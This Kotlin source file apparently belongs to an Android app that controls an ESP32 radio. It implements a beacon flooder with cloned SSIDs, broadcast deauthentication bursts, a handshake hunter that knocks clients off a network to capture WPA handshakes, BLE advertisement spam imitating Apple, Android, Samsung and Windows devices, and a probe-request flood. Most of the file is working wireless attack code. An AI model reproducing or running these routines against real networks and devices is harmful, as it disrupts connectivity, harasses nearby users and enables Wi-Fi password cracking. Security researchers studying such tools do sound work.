package com.wigglefish.android

import android.content.Context
import android.media.AudioManager
import android.media.ToneGenerator
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledFuture
import java.util.concurrent.TimeUnit
import org.json.JSONObject

/**
 * High-level coordinator for active and defensive wireless tools.
 * Manages state machines, background timing, and serial dispatch to ESP32 transceiver.
 */
class WirelessToolsController(
    private val context: Context,
    private val serial: UsbSerialController,
    private val packetAnalyzer: PacketAnalyzer,
    private val writeSmartLightColor: (Int, Int, Int) -> Boolean,
    private val writeSmartLightPower: (Boolean) -> Boolean,
    private val onStatusUpdate: (String) -> Unit
) {

    data class ToolRuntimeState(
        val beaconMode: BeaconMode,
        val bleSpamMode: BleSpamMode,
        val geigerTarget: String?,
        val activeHuntBssid: String?,
        val activeHuntChannel: Int,
        val isCaptivePortalDemoActive: Boolean,
        val captivePortalSsid: String,
        val isProbeFloodActive: Boolean,
        val isSmartLightAnimationActive: Boolean,
        val smartLightMode: SmartLightMode,
        val isPcapActive: Boolean,
        val beaconFramesSent: Long,
        val bleAdvertisementsSent: Long,
        val deauthFramesSent: Long,
        val probeFramesSent: Long,
        val rawWifiFramesObserved: Long,
        val smartLightCommandsSent: Long,
        val lastEvent: String,
        val lastEventAt: Long,
    )

    enum class BeaconMode {
        OFF, RANDOM, RICKROLL, CLONED
    }

    enum class BleSpamMode {
        OFF, APPLE, ANDROID, SAMSUNG, WINDOWS, ALL_IN_ONE
    }

    enum class SmartLightMode {
        OFF, LAST_COMMAND, RAINBOW
    }

    private val executor = Executors.newScheduledThreadPool(2)
    private val mainHandler = Handler(Looper.getMainLooper())
    private var pcapWriter: PcapWriter? = null

    // Beacon flooder state
    @Volatile var beaconMode = BeaconMode.OFF
        private set
    private var beaconTask: ScheduledFuture<*>? = null
    private val rickrollList = listOf(
        "01 Never Gonna", "02 Give You Up", "03 Never Gonna", "04 Let You Down",
        "05 Never Gonna", "06 Run Around", "07 And Desert You", "08 Never Gonna",
        "09 Make You Cry", "10 Never Gonna", "11 Say Goodbye", "12 Never Gonna",
        "13 Tell a Lie", "14 And Hurt You"
    )
    private val randomSsidList = listOf(
        "FBI Surveillance Van #42", "Pretty Fly for a Wi-Fi", "Skynet Defense Node",
        "Drop Tables Gateway", "Virus Inbound 5G", "Get Off My LAN",
        "Free High-Speed Wi-Fi", "Area 51 Uplink", "Caffeine & Packets",
        "Cyberpunk Subnet 2077", "NSA Listening Post", "404 Network Unavailable",
        "Wu-Tang LAN", "Tell My Wi-Fi Love Her", "Winternet Is Coming"
    )

    // BLE spam state
    @Volatile var bleSpamMode = BleSpamMode.OFF
        private set
    private var bleSpamTask: ScheduledFuture<*>? = null

    // Geiger Counter / Target Hunter state
    @Volatile var geigerTarget: String? = null
        private set
    @Volatile var geigerAudioEnabled = true
    @Volatile var geigerHapticEnabled = true
    private var toneGenerator: ToneGenerator? = null
    private var vibrator: Vibrator? = null
    private var lastGeigerClickTime = 0L

    // Handshake hunter state
    @Volatile var activeHuntBssid: String? = null
        private set
    @Volatile var activeHuntChannel: Int = 1

    // Captive portal demo state
    @Volatile var isCaptivePortalDemoActive = false
        private set
    @Volatile var captivePortalSsid = "Wigglefish-Lab"
        private set

    // Probe Flooder state
    @Volatile var isProbeFloodActive = false
        private set
    private var probeFloodTask: ScheduledFuture<*>? = null

    // Smart Light controller state
    private var lightAnimTask: ScheduledFuture<*>? = null
    @Volatile var smartLightMode = SmartLightMode.OFF
        private set

    @Volatile private var beaconFramesSent = 0L
    @Volatile private var bleAdvertisementsSent = 0L
    @Volatile private var deauthFramesSent = 0L
    @Volatile private var probeFramesSent = 0L
    @Volatile private var rawWifiFramesObserved = 0L
    @Volatile private var smartLightCommandsSent = 0L
    @Volatile private var lastEvent = "Tools idle"
    @Volatile private var lastEventAt = System.currentTimeMillis()

    init {
        try {
            toneGenerator = ToneGenerator(AudioManager.STREAM_MUSIC, 70)
        } catch (_: Exception) {}

        vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vibratorManager = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as? VibratorManager
            vibratorManager?.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
        }
    }

    fun startPcapCapture(filename: String = "wigglefish-${System.currentTimeMillis()}.pcap"): File {
        pcapWriter?.close()
        val writer = PcapWriter.createSessionPcap(context, filename)
        pcapWriter = writer
        onStatusUpdate("PCAP logging active: $filename")
        return writer.getFile()
    }

    fun stopPcapCapture() {
        pcapWriter?.close()
        pcapWriter = null
        onStatusUpdate("PCAP capture saved")
    }

    fun getPcapWriter(): PcapWriter? = pcapWriter

    fun getRuntimeState(): ToolRuntimeState = ToolRuntimeState(
        beaconMode = beaconMode,
        bleSpamMode = bleSpamMode,
        geigerTarget = geigerTarget,
        activeHuntBssid = activeHuntBssid,
        activeHuntChannel = activeHuntChannel,
        isCaptivePortalDemoActive = isCaptivePortalDemoActive,
        captivePortalSsid = captivePortalSsid,
        isProbeFloodActive = isProbeFloodActive,
        isSmartLightAnimationActive = lightAnimTask != null,
        smartLightMode = smartLightMode,
        isPcapActive = pcapWriter != null,
        beaconFramesSent = beaconFramesSent,
        bleAdvertisementsSent = bleAdvertisementsSent,
        deauthFramesSent = deauthFramesSent,
        probeFramesSent = probeFramesSent,
        rawWifiFramesObserved = rawWifiFramesObserved,
        smartLightCommandsSent = smartLightCommandsSent,
        lastEvent = lastEvent,
        lastEventAt = lastEventAt,
    )

    private fun publishStatus(message: String) {
        lastEvent = message
        lastEventAt = System.currentTimeMillis()
        onStatusUpdate(message)
    }

    // -------------------------------------------------------------
    // Raw packet ingestion from ESP32
    // -------------------------------------------------------------

    fun handleRawWifiFrame(channel: Int, rssi: Int, dataHex: String) {
        val bytes = RadioProtocols.hexToBytes(dataHex)
        if (bytes.isNotEmpty()) {
            rawWifiFramesObserved++
            pcapWriter?.writePacket(bytes)
            packetAnalyzer.processFrame(bytes, channel, rssi)

            // If Geiger hunter is targeting this frame's source/bssid
            val target = geigerTarget
            if (target != null && bytes.size >= 24) {
                val addr1 = RadioProtocols.formatMac(bytes, 4)
                val addr2 = RadioProtocols.formatMac(bytes, 10)
                val addr3 = RadioProtocols.formatMac(bytes, 16)
                if (addr1.equals(target, ignoreCase = true) ||
                    addr2.equals(target, ignoreCase = true) ||
                    addr3.equals(target, ignoreCase = true)) {
                    processGeigerPing(rssi)
                }
            }
        }
    }

    // -------------------------------------------------------------
    // Beacon Spammer / Flooder
    // -------------------------------------------------------------

    fun startBeaconSpam(mode: BeaconMode, clonedSsids: List<String> = emptyList()) {
        stopBeaconSpam()
        beaconMode = mode
        if (mode == BeaconMode.OFF) return

        publishStatus("Beacon Flooder started: $mode")
        var channel = 1

        beaconTask = executor.scheduleWithFixedDelay({
            try {
                val list = when (mode) {
                    BeaconMode.RANDOM -> randomSsidList
                    BeaconMode.RICKROLL -> rickrollList
                    BeaconMode.CLONED -> if (clonedSsids.isNotEmpty()) clonedSsids else randomSsidList
                    BeaconMode.OFF -> return@scheduleWithFixedDelay
                }

                for (ssid in list) {
                    if (beaconMode == BeaconMode.OFF) break
                    val frame = RadioProtocols.createBeaconFrame(
                        ssid = ssid,
                        channel = channel,
                        isWpa2 = true
                    )
                    val hex = RadioProtocols.bytesToHex(frame)
                    val cmd = JSONObject().apply {
                        put("cmd", "tx_raw")
                        put("channel", channel)
                        put("data_hex", hex)
                        put("count", 1)
                        put("delay_ms", 2)
                    }
                    serial.send(cmd.toString())
                    beaconFramesSent++
                    Thread.sleep(10)
                }

                channel = if (channel >= 11) 1 else channel + 5
            } catch (_: Exception) {}
        }, 0, 300, TimeUnit.MILLISECONDS)
    }

    fun stopBeaconSpam() {
        beaconMode = BeaconMode.OFF
        beaconTask?.cancel(true)
        beaconTask = null
        publishStatus("Beacon Flooder stopped")
    }

    // -------------------------------------------------------------
    // Targeted Deauthentication
    // -------------------------------------------------------------

    fun sendDeauthBurst(
        bssid: String,
        clientMac: String = "FF:FF:FF:FF:FF:FF",
        channel: Int = 1,
        count: Int = 15,
        onComplete: (() -> Unit)? = null
    ) {
        executor.execute {
            try {
                val apBytes = RadioProtocols.parseMac(bssid)
                val clientBytes = RadioProtocols.parseMac(clientMac)
                val deauthFrame = RadioProtocols.createDeauthFrame(apBytes, clientBytes, reasonCode = 7)
                val hex = RadioProtocols.bytesToHex(deauthFrame)

                val cmd = JSONObject().apply {
                    put("cmd", "tx_raw")
                    put("channel", channel)
                    put("data_hex", hex)
                    put("count", count)
                    put("delay_ms", 8)
                }
                serial.send(cmd.toString())
                deauthFramesSent += count.toLong()
                mainHandler.post {
                    publishStatus("Deauth burst sent ($count frames) -> $bssid")
                    onComplete?.invoke()
                }
            } catch (e: Exception) {
                mainHandler.post { publishStatus("Deauth error: ${e.message}") }
            }
        }
    }

    // -------------------------------------------------------------
    // Handshake Hunter (Target -> Deauth -> Sniff EAPOL/PMKID)
    // -------------------------------------------------------------

    fun startHandshakeHunt(targetBssid: String, targetSsid: String, channel: Int) {
        activeHuntBssid = targetBssid
        activeHuntChannel = channel

        if (pcapWriter == null) {
            startPcapCapture("handshake-hunt-${targetBssid.replace(":", "")}.pcap")
        }

        // 1. Tune ESP32 channel and enable promiscuous sniffer
        val chCmd = JSONObject().apply {
            put("cmd", "set_channel")
            put("channel", channel)
        }
        serial.send(chCmd.toString())

        val promiscCmd = JSONObject().apply {
            put("cmd", "promisc_on")
            put("filter", "all")
        }
        serial.send(promiscCmd.toString())

        publishStatus("Handshake hunter running on ch $channel for $targetSsid ($targetBssid)")

        // 2. Pulse 8 deauth frames after 500ms to kick client and capture reconnect EAPOL
        executor.schedule({
            sendDeauthBurst(targetBssid, "FF:FF:FF:FF:FF:FF", channel, count = 8)
        }, 500, TimeUnit.MILLISECONDS)
    }

    fun stopHandshakeHunt() {
        activeHuntBssid = null
        val promiscCmd = JSONObject().apply {
            put("cmd", "promisc_off")
        }
        serial.send(promiscCmd.toString())
        publishStatus("Handshake hunter stopped")
    }

    // -------------------------------------------------------------
    // BLE Ecosystem Spammer
    // -------------------------------------------------------------

    fun startBleSpam(mode: BleSpamMode) {
        stopBleSpam()
        bleSpamMode = mode
        if (mode == BleSpamMode.OFF) return

        publishStatus("BLE Spammer active: $mode")
        var step = 0

        bleSpamTask = executor.scheduleWithFixedDelay({
            try {
                val payload: ByteArray = when (mode) {
                    BleSpamMode.APPLE -> {
                        val devices = RadioProtocols.AppleDevice.values()
                        RadioProtocols.createAppleAdv(devices[step % devices.size])
                    }
                    BleSpamMode.ANDROID -> {
                        val modelIds = intArrayOf(0xF37335, 0x821360, 0x00019C, 0xF8F97E, 0x51E281)
                        RadioProtocols.createAndroidFastPairAdv(modelIds[step % modelIds.size])
                    }
                    BleSpamMode.SAMSUNG -> RadioProtocols.createSamsungBudsAdv()
                    BleSpamMode.WINDOWS -> RadioProtocols.createWindowsSwiftPairAdv("SwiftPair Device #${step % 99}")
                    BleSpamMode.ALL_IN_ONE -> {
                        when (step % 4) {
                            0 -> RadioProtocols.createAppleAdv(RadioProtocols.AppleDevice.AIRPODS_PRO)
                            1 -> RadioProtocols.createAndroidFastPairAdv(0xF37335)
                            2 -> RadioProtocols.createSamsungBudsAdv()
                            else -> RadioProtocols.createWindowsSwiftPairAdv("Nearby Peripheral")
                        }
                    }
                    BleSpamMode.OFF -> return@scheduleWithFixedDelay
                }

                step++
                val hex = RadioProtocols.bytesToHex(payload)
                val cmd = JSONObject().apply {
                    put("cmd", "ble_adv_raw")
                    put("payload_hex", hex)
                }
                serial.send(cmd.toString())
                bleAdvertisementsSent++
            } catch (_: Exception) {}
        }, 0, 150, TimeUnit.MILLISECONDS)
    }

    fun stopBleSpam() {
        bleSpamMode = BleSpamMode.OFF
        bleSpamTask?.cancel(true)
        bleSpamTask = null
        val cmd = JSONObject().apply { put("cmd", "ble_adv_stop") }
        serial.send(cmd.toString())
        publishStatus("BLE Spammer stopped")
    }

    // -------------------------------------------------------------
    // Geiger Counter / Target Hunter
    // -------------------------------------------------------------

    fun setGeigerTarget(mac: String?) {
        geigerTarget = mac?.uppercase()
        if (mac != null) {
            publishStatus("Geiger Counter locked onto $geigerTarget")
        } else {
            publishStatus("Geiger Counter unlocked")
        }
    }

    fun processGeigerPing(rssi: Int) {
        val now = System.currentTimeMillis()
        // Map RSSI (-100 dBm to -30 dBm) to click delay (800ms down to 50ms)
        val clampedRssi = rssi.coerceIn(-100, -30)
        val factor = (clampedRssi + 100) / 70.0 // 0.0 (weak) to 1.0 (strong)
        val minIntervalMs = (800 - (factor * 750)).toLong().coerceAtLeast(40L)

        if (now - lastGeigerClickTime >= minIntervalMs) {
            lastGeigerClickTime = now
            mainHandler.post {
                if (geigerAudioEnabled) {
                    try {
                        toneGenerator?.startTone(ToneGenerator.TONE_PROP_BEEP, 30)
                    } catch (_: Exception) {}
                }
                if (geigerHapticEnabled) {
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            val amplitude = (50 + (factor * 200)).toInt().coerceIn(1, 255)
                            vibrator?.vibrate(VibrationEffect.createOneShot(25, amplitude))
                        } else {
                            @Suppress("DEPRECATION")
                            vibrator?.vibrate(25)
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    // -------------------------------------------------------------
    // Smart RGB Light commands are delegated to the explicitly selected BLE light.
    // -------------------------------------------------------------

    fun sendSmartLightColor(r: Int, g: Int, b: Int) {
        dispatchSmartLightColor(r, g, b, stopAnimation = true, publishEachFrame = true)
    }

    private fun dispatchSmartLightColor(r: Int, g: Int, b: Int, stopAnimation: Boolean, publishEachFrame: Boolean) {
        if (stopAnimation) {
            stopSmartLightAnimInternal()
            smartLightMode = SmartLightMode.LAST_COMMAND
        }
        executor.execute {
            if (writeSmartLightColor(r, g, b)) {
                smartLightCommandsSent++
                if (publishEachFrame) {
                    mainHandler.post {
                        publishStatus("RGB command queued for the selected light")
                    }
                }
            }
        }
    }

    fun sendSmartLightPower(on: Boolean) {
        stopSmartLightAnimInternal()
        smartLightMode = SmartLightMode.LAST_COMMAND
        executor.execute {
            if (writeSmartLightPower(on)) {
                smartLightCommandsSent++
                mainHandler.post {
                    publishStatus("Selected light power ${if (on) "ON" else "OFF"} command queued")
                }
            }
        }
    }

    fun startSmartLightRainbow() {
        stopSmartLightAnimInternal()
        smartLightMode = SmartLightMode.RAINBOW
        publishStatus("Slow RGB cycle active for the selected light")
        var hue = 0f
        lightAnimTask = executor.scheduleWithFixedDelay({
            hue = (hue + 25f) % 360f
            val rgbColor = android.graphics.Color.HSVToColor(floatArrayOf(hue, 1f, 1f))
            val r = (rgbColor shr 16) and 0xFF
            val g = (rgbColor shr 8) and 0xFF
            val b = rgbColor and 0xFF
            dispatchSmartLightColor(r, g, b, stopAnimation = false, publishEachFrame = false)
        }, 0, 900, TimeUnit.MILLISECONDS)
    }

    fun stopSmartLightAnim() {
        stopSmartLightAnimInternal()
        publishStatus("Smart Light animation stopped")
    }

    private fun stopSmartLightAnimInternal() {
        lightAnimTask?.cancel(true)
        lightAnimTask = null
        if (smartLightMode == SmartLightMode.RAINBOW) {
            smartLightMode = SmartLightMode.OFF
        }
    }

    fun stopAllTools() {
        stopBeaconSpam()
        stopBleSpam()
        stopHandshakeHunt()
        stopSmartLightAnimInternal()
        stopProbeFlood()
        stopCaptivePortalDemo()
        stopPcapCapture()
        setGeigerTarget(null)
        publishStatus("All tools stopped")
    }

    // -------------------------------------------------------------
    // Transparent captive portal demonstration; no credentials are requested or stored.
    // -------------------------------------------------------------

    fun startCaptivePortalDemo(ssid: String = "Wigglefish-Lab"): Boolean {
        val cmd = JSONObject().apply {
            put("cmd", "portal_start")
            put("ssid", ssid)
        }
        if (!serial.send(cmd.toString())) {
            publishStatus("Could not send the captive portal demo command; connect the ESP32 first")
            return false
        }
        isCaptivePortalDemoActive = true
        captivePortalSsid = ssid
        publishStatus("Captive portal demo started on '$ssid'; credential capture is disabled")
        return true
    }

    fun stopCaptivePortalDemo() {
        val cmd = JSONObject().apply { put("cmd", "portal_stop") }
        if (!serial.send(cmd.toString())) {
            publishStatus("Could not send the portal stop command; the ESP32 may still be running the demo")
            return
        }
        isCaptivePortalDemoActive = false
        publishStatus("Captive portal demo stopped")
    }

    fun onCaptivePortalDemoFailed(reason: String) {
        isCaptivePortalDemoActive = false
        publishStatus(reason)
    }

    // -------------------------------------------------------------
    // Probe Request Flooder (IDS & WIPS Stress Tool)
    // -------------------------------------------------------------

    fun startProbeFlood(ssids: List<String> = emptyList()) {
        stopProbeFlood()
        isProbeFloodActive = true
        publishStatus("Probe Flooder active: Flooding all channels with randomized probes")

        val targetList = if (ssids.isNotEmpty()) ssids else listOf(
            "", "HomeNet", "Guest-WiFi", "Linksys", "NETGEAR", "iPhone", "Android-AP", "Office-LAN"
        )

        probeFloodTask = executor.scheduleWithFixedDelay({
            try {
                for (ch in 1..11) {
                    val targetSsid = targetList.random()
                    val probeFrame = RadioProtocols.createProbeRequest(targetSsid)
                    val hex = RadioProtocols.bytesToHex(probeFrame)
                    val cmd = JSONObject().apply {
                        put("cmd", "tx_raw")
                        put("channel", ch)
                        put("data_hex", hex)
                        put("count", 4)
                        put("delay_ms", 1)
                    }
                    serial.send(cmd.toString())
                    probeFramesSent += 4
                    Thread.sleep(8)
                }
            } catch (_: Exception) {}
        }, 0, 100, TimeUnit.MILLISECONDS)
    }

    fun stopProbeFlood() {
        isProbeFloodActive = false
        probeFloodTask?.cancel(true)
        probeFloodTask = null
        publishStatus("Probe Flooder stopped")
    }

    fun cleanup() {
        stopBeaconSpam()
        stopBleSpam()
        stopHandshakeHunt()
        stopSmartLightAnim()
        stopProbeFlood()
        stopCaptivePortalDemo()
        stopPcapCapture()
        toneGenerator?.release()
        executor.shutdownNow()
    }
}
